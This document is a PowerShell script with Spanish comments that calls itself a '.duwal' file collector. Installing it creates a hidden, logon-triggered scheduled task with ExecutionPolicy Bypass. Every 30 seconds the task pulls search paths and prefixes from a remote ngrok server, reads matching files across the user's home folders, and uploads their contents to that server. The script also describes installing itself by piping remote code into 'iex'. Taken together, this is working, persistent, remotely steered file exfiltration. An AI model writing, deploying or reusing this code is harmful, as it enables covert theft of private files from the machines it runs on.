<#
.SYNOPSIS
  Recolector .duwal todo-en-uno (version PowerShell del .bat).

.DESCRIPTION
  Un solo archivo con cuatro modos:
    install   (por defecto) Registra una tarea que recolecta cada 30 s y la arranca.
                            Idempotente: si la tarea ya existe, NO la reprograma.
    once                    Hace una sola pasada de recoleccion ahora.
    uninstall               Detiene y elimina la tarea.
    worker                  (uso interno) El bucle que ejecuta la tarea programada.

  Autocontenido: al instalar se copia a %LOCALAPPDATA%\recoleccion-duwal y la tarea
  apunta a esa copia, asi sigue funcionando aunque muevas o borres el repo.
  Solo usa Windows (modulo ScheduledTasks + PowerShell); no instala nada.

.EXAMPLE
  powershell -ExecutionPolicy Bypass -File .\recoleccion-duwal.ps1
  powershell -ExecutionPolicy Bypass -File .\recoleccion-duwal.ps1 once
  powershell -ExecutionPolicy Bypass -File .\recoleccion-duwal.ps1 once https://mi-backend
  powershell -ExecutionPolicy Bypass -File .\recoleccion-duwal.ps1 uninstall
#>
[CmdletBinding()]
param(
  [Parameter(Position = 0)]
  [ValidateSet('install', 'once', 'uninstall', 'worker')]
  [string]$Action = 'install',

  [Parameter(Position = 1)]
  [string]$ApiUrl = 'https://rd.ngrok.dev',

  [int]$IntervalSeconds = 30
)

$ErrorActionPreference = 'Stop'
$TaskName = 'Recoleccion duwal cada 30s'
$TargetDir = Join-Path $env:LOCALAPPDATA 'recoleccion-duwal'
$InstalledScript = Join-Path $TargetDir 'recoleccion-duwal.ps1'
# URL cruda del propio script: permite instalar con  iex (iwr <url>).Content
$SelfUrl = 'https://raw.githubusercontent.com/DuwalVC/RD-1/refs/heads/main/recoleccion-duwal.ps1'

# ---------------------------- Motor de recoleccion ----------------------------
$MaxContentBytes = 1MB
$SkipDirs = @('node_modules', '.git', 'dist', 'build', '.next',
              '$RECYCLE.BIN', 'System Volume Information', 'AppData')

function Expand-Home([string]$Path) {
  if ($Path.StartsWith('~')) {
    return Join-Path $env:USERPROFILE $Path.Substring(1).TrimStart('\', '/')
  }
  return $Path
}

function Get-MatchingFiles([string]$Dir, [string]$Prefix) {
  $entries = Get-ChildItem -LiteralPath $Dir -Force -ErrorAction SilentlyContinue
  foreach ($entry in $entries) {
    if ($entry.PSIsContainer) {
      if ($SkipDirs -notcontains $entry.Name) {
        Get-MatchingFiles -Dir $entry.FullName -Prefix $Prefix
      }
    }
    elseif ($entry.Name.StartsWith($Prefix)) {
      $entry
    }
  }
}

function Send-File($File, [string]$Prefix, [string]$Base) {
  $omit = $File.Length -gt $MaxContentBytes
  $payload = @{
    fileName       = $File.Name
    path           = $File.FullName
    sizeBytes      = [int]$File.Length
    matchedPrefix  = $Prefix
    modifiedAt     = $File.LastWriteTimeUtc.ToString('yyyy-MM-ddTHH:mm:ss.fffZ')
    contentOmitted = $omit
  }
  if (-not $omit) {
    $payload.content = [System.IO.File]::ReadAllText($File.FullName)
  }
  $json = $payload | ConvertTo-Json -Depth 3
  $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
  Invoke-RestMethod -Method Post -Uri "$Base/files" `
    -ContentType 'application/json; charset=utf-8' -Body $bytes | Out-Null
}

function Invoke-OnePass([string]$Url, [switch]$ShowOutput) {
  $Base = "$Url/api/v1"
  $patterns = Invoke-RestMethod -Uri "$Base/patterns?enabled=true"
  if (-not $patterns) { return }
  foreach ($pattern in $patterns) {
    $root = Expand-Home $pattern.rootPath
    if (-not (Test-Path -LiteralPath $root)) { continue }
    $n = 0
    foreach ($file in Get-MatchingFiles -Dir $root -Prefix $pattern.prefix) {
      try { Send-File -File $file -Prefix $pattern.prefix -Base $Base; $n++ } catch { }
    }
    if ($ShowOutput) { Write-Host "Busqueda '$($pattern.prefix)' en $root -> $n archivo(s)" }
  }
}

# --------------------------------- Acciones -----------------------------------
function Invoke-Worker {
  while ($true) {
    try { Invoke-OnePass -Url $ApiUrl } catch { }
    Start-Sleep -Seconds $IntervalSeconds
  }
}

function Invoke-OnceMode {
  Write-Host "Recolectando una vez contra $ApiUrl ..."
  Invoke-OnePass -Url $ApiUrl -ShowOutput
}

function Invoke-Install {
  # Idempotente: si la tarea ya existe, no reprogramar.
  $existing = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
  if ($existing) {
    Write-Host "La tarea `"$TaskName`" YA estaba instalada. No se reprograma."
    Write-Host "Para reinstalar desde cero: ejecuta el modo 'uninstall' y vuelve a instalar."
    return
  }

  # Dejar una copia en %LOCALAPPDATA% para sobrevivir aunque muevas o borres el repo.
  if (-not (Test-Path -LiteralPath $TargetDir)) {
    New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
  }
  if ($PSCommandPath -and (Test-Path -LiteralPath $PSCommandPath)) {
    # Ejecutado como archivo (-File): copiar este mismo script.
    Copy-Item -LiteralPath $PSCommandPath -Destination $InstalledScript -Force
  }
  else {
    # Ejecutado en memoria (iex): descargar una copia estable desde el repo.
    Invoke-WebRequest -Uri $SelfUrl -OutFile $InstalledScript
  }

  $arg = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstalledScript`" worker $ApiUrl"
  $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $arg
  $trigger = New-ScheduledTaskTrigger -AtLogOn
  Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger `
    -Description 'Recoleccion .duwal cada 30 s' -Force | Out-Null

  Start-ScheduledTask -TaskName $TaskName

  Write-Host "============================================================"
  Write-Host " Listo. Recoleccion .duwal VIVA cada 30 s.  Backend: $ApiUrl"
  Write-Host "  - Arranca sola cada vez que inicies sesion."
  Write-Host "  - Worker instalado en: $InstalledScript"
  Write-Host "  - Quitar:  modo 'uninstall'"
  Write-Host "============================================================"
}

function Invoke-Uninstall {
  $existing = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
  if ($existing) {
    Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
    Write-Host "Recoleccion detenida y tarea eliminada."
  }
  else {
    Write-Host "No habia tarea instalada."
  }
}

switch ($Action) {
  'install'   { Invoke-Install }
  'once'      { Invoke-OnceMode }
  'uninstall' { Invoke-Uninstall }
  'worker'    { Invoke-Worker }
}
